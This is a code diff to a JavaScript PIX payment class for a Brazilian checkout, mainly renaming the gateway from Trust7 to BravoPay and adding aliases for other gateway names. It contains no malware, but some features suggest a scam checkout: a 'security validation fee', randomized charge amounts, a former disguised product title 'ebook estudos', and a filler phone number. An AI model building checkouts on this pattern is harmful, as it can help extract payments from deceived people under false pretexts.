@@ -1,7 +1,8 @@
 /**
- * Trust7 Payment Gateway via checkout PHP
+ * BravoPay Payment Gateway via checkout PHP
+ * Comunica com o roteador /checkout/pagamento.php (que despacha para pagamento-bravopay.php)
  */
-class Trust7Payment {
+class BravopayPayment {
     constructor() {
         this.checkoutCreateUrl = '/checkout/pagamento.php';
         this.checkoutStatusUrl = '/checkout/verificar.php';
@@ -12,7 +13,7 @@ class Trust7Payment {
             tangible: false
         };
         this.resolveAmount();
-        console.log('✅ Trust7 Payment inicializado');
+        console.log('✅ BravoPay Payment inicializado');
     }
 
     resolveAmount() {
@@ -28,7 +29,7 @@ class Trust7Payment {
         }
 
         this.productConfig.amount = this.randomizeTaxaCents(taxa);
-        
+
         if (taxa === 39.9) {
             this.productConfig.title = 'Taxa de Validacao de Seguranca';
         } else {
@@ -64,7 +65,7 @@ class Trust7Payment {
         const errors = [];
         const cpf = userData?.CPF || userData?.cpf || '';
         const nome = userData?.NOME || userData?.nome || '';
-        if (!cpf || String(cpf).replace(/\D/g, '').length < 11) errors.push('CPF inválido ou ausente');
+        if (!cpf || String(cpf).replace(/\D/g, '').length < 11) errors.push('Documento inválido ou ausente');
         if (!nome || String(nome).trim().length < 3) errors.push('Nome inválido ou ausente');
         return { isValid: errors.length === 0, errors };
     }
@@ -115,10 +116,10 @@ class Trust7Payment {
                 email: email,
                 cpf: cpf,
                 telefone: telefone.length >= 10 ? telefone : '11999999999',
-                product_title: 'ebook estudos'
+                product_title: this.productConfig.title
             }, this.getUtmParams());
 
-            console.log('📤 Criando PIX na Trust7 via /checkout/pagamento.php', { valor: payload.valor, cpf: payload.cpf });
+            console.log('📤 Criando PIX na BravoPay via /checkout/pagamento.php', { valor: payload.valor, cpf: payload.cpf });
 
             const response = await fetch(this.checkoutCreateUrl, {
                 method: 'POST',
@@ -147,10 +148,10 @@ class Trust7Payment {
                 rawData: data
             };
 
-            console.log('✅ PIX gerado (Trust7):', result.transactionId);
+            console.log('✅ PIX gerado (BravoPay):', result.transactionId);
             return result;
         } catch (error) {
-            console.error('❌ Erro ao criar PIX na Trust7:', error);
+            console.error('❌ Erro ao criar PIX na BravoPay:', error);
             return { success: false, error: error.message, details: error };
         }
     }
@@ -174,7 +175,7 @@ class Trust7Payment {
                 rawData: data
             };
         } catch (error) {
-            console.error('❌ Erro ao verificar status (Trust7):', error);
+            console.error('❌ Erro ao verificar status (BravoPay):', error);
             return { success: false, error: error.message };
         }
     }
@@ -223,8 +224,11 @@ class Trust7Payment {
                 });
             }
         } catch (e) {}
-        console.log('📊 Tracking (Trust7):', eventName, transactionId, value);
+        console.log('📊 Tracking (BravoPay):', eventName, transactionId, value);
     }
 }
 
-window.Trust7Payment = Trust7Payment;
+window.BravopayPayment = BravopayPayment;
+// Aliases de compatibilidade com o código existente das páginas
+window.BlackcatPayment = BravopayPayment;
+window.MedusapayPayment = BravopayPayment;
